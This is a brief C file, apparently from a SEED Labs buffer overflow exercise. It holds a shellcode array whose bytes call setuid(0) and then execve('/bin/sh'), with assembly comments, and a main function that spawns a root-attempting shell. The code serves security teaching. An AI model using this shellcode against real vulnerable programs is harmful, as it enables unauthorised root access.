#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
char shellcode[] =
"\x31\xc0" /* Line 1: xorl %eax,%eax */
"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
"\xb0\xd5" /* Line 3: movb $0xd5,%al */
"\xcd\x80" /* Line 4: int $0x80 */
// ---- The code below is the same as the one in Task 2 ---
//SEED Labs – Buffer Overflow Vulnerability Lab 9
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80";
int main()
{
char *argv[2];
argv[0] = "/bin/sh";
argv[1] = NULL;
setuid(0);
execve("/bin/sh", argv, NULL);
return 0;
}
